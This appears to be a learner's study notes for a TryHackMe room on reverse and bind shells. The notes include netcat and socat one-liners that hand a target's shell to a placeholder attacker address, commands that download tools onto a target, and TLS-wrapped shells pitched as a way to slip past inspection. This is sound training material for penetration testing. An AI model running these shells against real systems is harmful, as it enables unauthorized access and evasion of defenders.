# Shells & Listeners Fundamentals (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Metasploit and Exploitation (room 6 of the module).
- **Room:** Shells & Listeners Fundamentals (~60 min, premium). Create, catch, stabilise, and encrypt
  reverse/bind shells with `nc` and `socat`; Linux practice box + a Windows Server 2019 (XAMPP) practice box.
- **Date:** 2026-10-16.
- **Status:** SOLVED - all graded questions (Tasks 2-7). Tasks 1/8/9 are no-answer-needed checkboxes
  (hands-on practice + conclusion). Answers are command/concept recall from the task text; no target
  interaction was required to grade them.
- **Lab (optional practice):** Linux box via SSH `shell : <redacted-pw>`; Windows box
  `<ip>` via `xfreerdp ... /u:Administrator /p:'<redacted-pw>'`. Both ship `nc` and `socat`.

## Answers

| Task | Question | Answer |
|------|----------|--------|
| 2 | Shell that connects back to your listener (R/B) | *(find it yourself)* |
| 2 | Bind shell - run the listener on Attacker or Target | *(find it yourself)* |
| 2 | Inbound blocked, outbound allowed -> which shell (R/B) | *(find it yourself)* |
| 3 | Tool that allocates PTYs for fully interactive shells | *(find it yourself)* |
| 3 | Metasploit component that generates payloads | *(find it yourself)* |
| 4 | Option that tells netcat to listen | *(find it yourself)* |
| 4 | Connect to a bind shell on <ip>:8090 | *(find it yourself)* |
| 4 | Netcat flag that skips DNS (numeric only) | *(find it yourself)* |
| 5 | Make socat listen on TCP 8080 | *(find it yourself)* |
| 5 | Windows socat reverse shell - option after the exe | *(find it yourself)* |
| 6 | Bring the backgrounded shell to the foreground | *(find it yourself)* |
| 6 | Set terminal width to 238 columns | *(find it yourself)* |
| 6 | Python3 web server on port 80 to serve socat | *(find it yourself)* |
| 7 | Socat parameter that disables cert verification | *(find it yourself)* |
| 7 | OpenSSL flag for a 2048-bit RSA key pair | *(find it yourself)* |

## Reverse vs bind (the one distinction to keep straight)

Direction is defined by **who initiates the TCP connection**, and that decides which end runs the listener:

- **Reverse shell:** attacker runs the listener (`nc -lvnp 4444`); the **target dials out** to it. Wins when
  the target can make outbound connections / is behind NAT / inbound is firewalled. The common default,
  because egress is usually less restricted than ingress.
- **Bind shell:** the **target runs the listener** attached to a shell (`nc -lvnp 8080 -e /bin/bash`); the
  attacker connects in. Wins when outbound from the target is locked down but an inbound port is reachable,
  or when several operators need to attach to the same listener. Often killed by the target's inbound firewall.

Mnemonic: *reverse = target comes to you; bind = target waits for you.* "Strict firewall, inbound blocked,
outbound allowed" is always reverse.

## Netcat

```bash
# attacker: catch a reverse shell  (l=listen, v=verbose, n=no DNS, p=port)
sudo nc -lvnp 4444
# target: call back and hand over a shell (needs an -e-capable nc)
nc CONNECTION_IP 4444 -e /bin/bash

# bind: target listens WITH a shell attached, attacker connects in
nc -lvnp 8080 -e /bin/bash      # on target
nc <ip> 8090             # on attacker (connect to a bind shell)
```

- `-e` is **absent on OpenBSD netcat** (removed for safety) - then you fall back to named-pipe (FIFO)
  tricks or other techniques. Traditional/GNU nc and `ncat` may support it.
- `ncat` (Nmap project) is the modern reimplementation: adds SSL/TLS, proxying, connection brokering,
  better IPv6. Basic shell usage is the same as `nc`.
- Ports >1024 (4444, 8080) need no root; 80/443/53 may pass firewalls but need `sudo` to bind.

## Socat

Syntax is `socat [opts] address1 address2`; `-` = your stdin/stdout.

```bash
# reverse
socat TCP-L:443 -                                   # attacker listener
socat TCP:CONNECTION_IP:443 EXEC:"bash -li"         # target (login interactive shell)
socat TCP:CONNECTION_IP:443 EXEC:powershell.exe,pipes   # Windows target (note: pipes)

# bind
socat TCP-L:8088 EXEC:"bash -li"                    # target listens
socat TCP:MACHINE_IP:8088 -                         # attacker connects in
```

- **Windows always needs `,pipes`** after the executable (`cmd.exe,pipes` / `powershell.exe,pipes`) so
  socat wires up Windows named pipes for I/O correctly.
- Socat's edge over nc: **PTY allocation** (real terminal, signals, job control) and **SSL/TLS**. Downside:
  not always pre-installed - transfer a static binary during initial access.

## Shell stabilisation (raw nc shell -> real TTY)

```bash
# 0. on attacker, note your real terminal size first
stty size                 # e.g. 50 220  (rows cols)

# 1. inside the netcat shell: spawn a PTY with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# 2. background it, put YOUR terminal in raw mode, resume
#    Ctrl+Z
stty raw -echo
fg

# 3. back in the target shell, match the size you noted
stty rows 50 cols 238     # "stty cols 238" sets width alone

# cleanup: `stty sane` restores your terminal on exit;
# if the link drops in raw mode, blind-type `reset` + Enter.
```

- `stty raw` = send keystrokes straight through (so Ctrl+C etc. reach the target); `-echo` = stop the
  double-typed characters.
- **`rlwrap nc -lvnp 4444`** wraps the listener to add readline: command history, arrow keys, tab
  completion - do the Python steps on top of it for a genuinely comfortable shell.
- **Fully interactive socat TTY** (gold standard - vim, Ctrl+Z, job control all work):
  ```bash
  # attacker
  socat TCP-L:5555 FILE:`tty`,raw,echo=0
  # target
  /tmp/socat TCP:CONNECTION_IP:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
  ```
  `pty` (allocate terminal), `stderr` (forward errors), `sigint` (Ctrl+C), `setsid` (new session for job
  control), `sane` (standard terminal settings).
- Transfer socat to the target through the existing shell:
  ```bash
  sudo python3 -m http.server 80                              # attacker serves cwd
  wget http://CONNECTION_IP/socat -O /tmp/socat && chmod +x /tmp/socat   # Linux target
  Invoke-WebRequest -Uri http://CONNECTION_IP/socat.exe -OutFile C:\Windows\Temp\socat.exe  # Windows
  ```

## Encrypted shells (socat + OpenSSL)

Plaintext shells are loud: IDS flags `nc` to :4444, DLP reads your commands. Wrapping in TLS makes traffic
look like HTTPS and defeats content inspection. Prefer **443** (then 8443/9443) so it blends in.

```bash
# 1. self-signed cert + key, then combine into one PEM for socat
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# 2. encrypted reverse shell
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -          # attacker
socat OPENSSL:CONNECTION_IP:443,verify=0 EXEC:/bin/bash     # target

# 3. encrypted + full TTY (best of both)
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
socat OPENSSL:CONNECTION_IP:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- `-newkey rsa:2048` = generate a fresh 2048-bit RSA keypair; `-nodes` = no passphrase on the key;
  `-x509` = emit a self-signed cert instead of a CSR; `-days 365` = validity.
- **Only the listener needs `cert=`**; both ends need **`verify=0`** or you get "certificate verify failed".
- For a bind shell the *target* holds the cert and listens (`OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0`);
  you connect with `OPENSSL:MACHINE_IP:8443,verify=0 -`.
- Debug: `socat -V` must list OpenSSL support; use absolute cert paths; both ends `verify=0`.

## Lessons learned

- **Listener location is the whole game.** Reverse = *attacker* listens, target dials out. Bind = *target*
  listens, attacker dials in. Get that right and every "R/B, A/T" question answers itself; firewalls that
  block inbound but allow outbound always point to reverse.
- **`-e` is not portable.** OpenBSD netcat strips it, so a copied `nc ... -e /bin/bash` one-liner can fail on
  the target even though the listener is fine - have a FIFO/`socat`/`ncat` fallback ready.
- **Stabilise in a fixed order or it fights you:** `python3 -c 'import pty; pty.spawn("/bin/bash")'` ->
  `export TERM=xterm` -> Ctrl+Z -> `stty raw -echo` -> `fg` -> `stty rows R cols C`. Skipping the size step
  leaves `vim`/`less` misrendered; forgetting `stty sane` on exit leaves your own terminal broken.
- **Match the transport to the defence, not just the port.** Running `socat OPENSSL:...:443` beats raw
  `nc`/`socat` on 443 against DPI/DLP because the bytes are real TLS - same lesson as the Payload Generation
  room, where `reverse_tcp:443` died to inspection but `reverse_https:443` walked through. "HTTPS-looking
  port" is not the same as "HTTPS-looking traffic".
- **Capability ladder:** `nc` (prove it works) -> `rlwrap nc` (history/editing) -> `socat` PTY (stability,
  interactive programs, job control) -> `socat OPENSSL` (stealth) -> `msfvenom` + `multi/handler`
  (staged/cross-platform/Meterpreter, session management). Start light, upgrade as the engagement needs it.

## Related

- [[metasploit-payload-generation]] - `msfvenom`/`multi/handler` are the "enterprise" rung of the same
  listener ladder; the reverse_https-beats-reverse_tcp-under-DPI lesson repeats here as socat OPENSSL.
- [[metasploit-module-plan]] - last remaining path room after this: Shell Payload Generation & Delivery.
